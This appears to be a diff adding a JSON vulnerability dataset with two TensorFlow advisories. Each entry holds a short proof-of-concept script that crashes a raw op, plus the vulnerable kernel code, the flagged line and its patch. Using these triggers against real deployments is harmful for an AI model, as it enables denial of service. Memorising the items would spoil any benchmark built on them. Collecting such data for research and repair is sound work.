@@ -1,0 +1,32 @@
+{
+    "data": [
+        {
+            "ID": "GHSA-g9fm-r5mm-rf9f",
+            "PoC Exploit Code": "import tensorflow as tf\ntf.raw_ops.SparseMatrixNNZ(sparse_matrix=[])",
+            "Function Name": "SparseMatrixNNZ",
+            "Relevant Commit Code": "Status ExtractVariantFromInput(OpKernelContext* ctx, int index, const T** value) {\n  const Tensor& input_t = ctx->input(index);\n  const Variant& input_variant = input_t.scalar<Variant>()();\n  *value = input_variant.get<T>();\n  if (*value == nullptr) {\n    return errors::InvalidArgument(\"Could not retrieve Variant input \", index);\n  }\n  if (!(*value)->valid()) {\n    return errors::InvalidArgument(\"Variant input \", index, \" is not valid.\");\n  }\n  return OkStatus();\n}",
+            "Vulnerability": "const Variant& input_variant = input_t.scalar<Variant>()();",
+            "Vulnerability Line Number": "636",
+            "Patch": [
+                "#include \"tensorflow/core/framework/tensor_shape.h\"",
+                "#include \"tensorflow/core/platform/errors.h\"",
+                "if (!TensorShapeUtils::IsScalar(input_t.shape())) { return errors::InvalidArgument(\"Invalid input matrix: Shape must be rank 0 but is rank \", input_t.dims()); }"
+            ],
+            "TensorFlow Version To Use": "2.17.0",
+            "Commit URL": "https://github.com/tensorflow/tensorflow/commit/f856d02e5322821aad155dad9b3acab1e9f5d693"
+        },
+        {
+            "ID": "GHSA-67pf-62xr-q35m",
+            "PoC Exploit Code": "import numpy as np\nimport tensorflow as tf\n\na = data_structures.tf_tensor_list_new(elements = tf.constant(value=[3, 4, 5]))\nb = np.zeros([0, 2, 3, 3])\n\ntf.raw_ops.TensorListResize(input_handle=a, size=b)",
+            "Function Name": "TensorListResize",
+            "Relevant Commit Code": "void Compute(OpKernelContext* c) override {\n    const TensorList* input_list = nullptr;\n    OP_REQUIRES_OK(c, GetInputList(c, 0, &input_list));\n    int32_t size = c->input(1).scalar<int32>()();\n    OP_REQUIRES(\n        c, size >= 0,\n        errors::InvalidArgument(\n            \"TensorListSlice expects size to be non-negative. Got: \", size));\n    std::unique_ptr<Tensor> maybe_result =\n        c->forward_input(0, 0, DT_VARIANT, TensorShape{},\n                         c->input_memory_type(0), AllocatorAttributes());\n    if (maybe_result != nullptr) {\n      TensorList* out = maybe_result->scalar<Variant>()().get<TensorList>();\n      if (out->RefCountIsOne()) {\n        // We are able to forward the input.\n        out->tensors().resize(size, Tensor(DT_INVALID));\n        c->set_output(0, *maybe_result);\n        return;\n      }\n    }\n    // We were not able to forward the input.  Will have to resize from scratch.\n    Tensor* result;\n    AllocatorAttributes attr;\n    attr.set_on_host(true);\n    OP_REQUIRES_OK(c, c->allocate_output(0, TensorShape{}, &result, attr));\n    TensorList output_list;\n    output_list.element_shape = input_list->element_shape;\n    output_list.element_dtype = input_list->element_dtype;\n    output_list.max_num_elements = input_list->max_num_elements;\n    if (size > input_list->tensors().size()) {\n      output_list.tensors().insert(output_list.tensors().begin(),\n                                   input_list->tensors().begin(),\n                                   input_list->tensors().end());\n      // Add DT_INVALID tensors to the end of the list if the requested size\n      // is larger than the list length.\n      output_list.tensors().resize(size, Tensor(DT_INVALID));\n    } else {\n      output_list.tensors().insert(output_list.tensors().begin(),\n                                   input_list->tensors().begin(),\n                                   input_list->tensors().begin() + size);\n    }\n    result->scalar<Variant>()() = std::move(output_list);\n  }",
+            "Vulnerability": "int32_t size = c->input(1).scalar<int32>()();",
+            "Vulnerability Line Number": "378",
+            "Patch": "OP_REQUIRES(c, TensorShapeUtils::IsScalar(c->input(1).shape()), errors::InvalidArgument(\"size must be a scalar\"));",
+            "TensorFlow Version To Use": "2.17.0",
+            "Commit URL": "https://github.com/tensorflow/tensorflow/commit/888e34b49009a4e734c27ab0c43b0b5102682c56"
+        }
+
+    ]
+
+    }
